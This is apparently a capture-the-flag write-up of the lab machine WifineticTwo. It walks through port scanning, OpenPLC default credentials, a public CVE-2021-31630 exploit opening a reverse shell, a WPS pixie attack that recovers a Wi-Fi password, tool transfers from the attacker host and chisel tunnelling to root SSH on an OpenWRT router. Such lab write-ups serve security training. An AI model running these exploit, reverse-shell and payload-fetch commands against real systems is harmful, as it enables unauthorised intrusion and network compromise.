---
title: WifineticTwo
published: true
layout: post
---

<br />

---------------
WifineticTwo is a medium-difficulty Linux machine that features OpenPLC running on port 8080, vulnerable to Remote Code Execution through the manual exploitation of [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630). After obtaining an initial foothold on the machine, a WPS attack is performed to acquire the Wi-Fi password for an Access Point (AP). This access allows the attacker to target the router running OpenWRT and gain a root shell via its web interface. 
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/_FaMtNITcCU?si=fDHYAmVC3iaazxc5" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 2 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sT 10.10.11.7 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.7 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sT 10.10.11.7 -p 22,8080 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are:
+ **22/tcp OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)**
+ **8080/tcp HAProxy http proxy**

<br />

------
<br />
### Foothold

Starting by the website, we can visit it to find a login screen:<br />
![](/assets/WifineticTwo/1.png)
<br />
<br />

Searching for **default credentials**, we find **openplc:openplc** credentials, which works!<br />
![](/assets/WifineticTwo/2.png)
<br />
<br />

Searching for vulnerabilities we find an authenticated RCE, which seems interesting:

```bash
searchsploit openplc
```

![](/assets/WifineticTwo/3.png)
<br />
<br />

However, this exploit didn't work, so I searched for another one until I found this [one](https://github.com/thewhiteh4t/cve-2021-31630), so let's download it:

```bash
git clone https://github.com/thewhiteh4t/cve-2021-31630.git
```
<br />

Now let's **open a listener** and wait for a reverse shell:

```bash
python3 cve_2021_31630.py -u openplc -p openplc -lh 10.10.16.12 -lp 4444 http://10.10.11.7:8080
```

![](/assets/WifineticTwo/4.png)
<br />
<br />

------
<br />
### Privilege Escalation

It seems that we are in a **container**, enumerating the machine, we can find a **wireless interface**:

```bash
ip a
```

![](/assets/WifineticTwo/5.png)
<br />
<br />

Let's see what's the purpose of this interface:

```bash
iwconfig
```

![](/assets/WifineticTwo/6.png)
<br />
<br />

This interface is in **managed mode** and is **not associated with any AP nor is functioning as an AP itself**. So let's scan for near APs:

```bash
iwlist wlan0 scan
```

![](/assets/WifineticTwo/7.png)
<br />
<br />

There is an AP with ESSID "plcrouter", let's inspect the **details of this AP**:

```bash
iw wlan0 scan
```

![](/assets/WifineticTwo/8.png)
<br />
<br />

This AP has WPS enabled, so we can try a pixie attack, to do this, I searched for a [script](https://raw.githubusercontent.com/kimocoder/OneShot/master/oneshot.py) that perform this attack, downloaded it and transfer it:

```bash
Kali> wget https://raw.githubusercontent.com/kimocoder/OneShot/master/oneshot.py
Kali> sudo python3 -m http.server 80
Target> curl -O http://10.10.16.12/oneshot.py
```
<br />

Now let's execute this script:

```bash
python3 oneshot.py -i wlan0
```

![](/assets/WifineticTwo/9.png)
<br />
<br />

Great!! We have the password, let's create a file to connect to the network and search for attempt lateral movement:

```bash
cat <<EOF > wpa.conf
network={
ssid="plcrouter"
psk="NoWWEDoKnowWhaTisReal123!"
}
EOF
```
<br />

Now that we have the configuration file, let's connect to the network:

```bash
wpa_supplicant -B -i wlan0 -c wpa.conf
```
<br />

Even though it throws some errors, we can see that it worked:

```bash
iwconfig wlan0
```

![](/assets/WifineticTwo/10.png)
<br />
<br />

However it seems that we still don't have an IP address, so let's ask for it:

```bash
ip a #To see if we have an IP address
dhclient #To request it
```
<br />

Let's now search for another hosts:

```bash
arp -a
```

![](/assets/WifineticTwo/11.png)
<br />
<br />

There is a host with IP 192.168.1.1, I will download nmap and transfer it to this host to inspect the host:

```bash
Kali> wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
Kali> python3 -m http.server 80
Target> curl -O 10.10.16.12/nmap
```
<br />

Now that we have transferred it, let's execute it:

```bash
chmod +x nmap
./nmap -sT 192.168.1.1
```

![](/assets/WifineticTwo/12.png)
<br />
<br />

There are multiple services, let's inspect the web service, to do this, I will download Chisel and send it to the target machine:

```bash
Kali> which chisel
Kali> cp /usr/bin/chisel .
Kali> python3 -m http.server 80
Target> curl -O http://10.10.16.12/chisel
```
<br />

Let's set up the tunnel:
```bash
Target> chmod +x chisel
Kali> chisel server --reverse -p 8080
Target> ./chisel client 10.10.16.12:8080 R:8888:192.168.1.1:80
```

![](/assets/WifineticTwo/13.png)
<br />
<br />

Let's connect to the website:<br />

![](/assets/WifineticTwo/14.png)
<br />
<br />

Luckily, if we attempt to log in without password, we can log in:<br />
![](/assets/WifineticTwo/15.png)
<br />
<br />

Inspecting the website, we can **upload our public SSH key** to log in to the machine, so I upload it:<br />
![](/assets/WifineticTwo/16.png)
<br />
<br />

Finally, let's tunnel the SSH service of the router and connect to it:

```bash
Kali> chisel server --reverse -p 8080
Target> ./chisel client 10.10.16.12:8080 R:2222:192.168.1.1:22
Kali> ssh root@0.0.0.0 -p 2222
```

![](/assets/WifineticTwo/18.png)
<br />
<br />
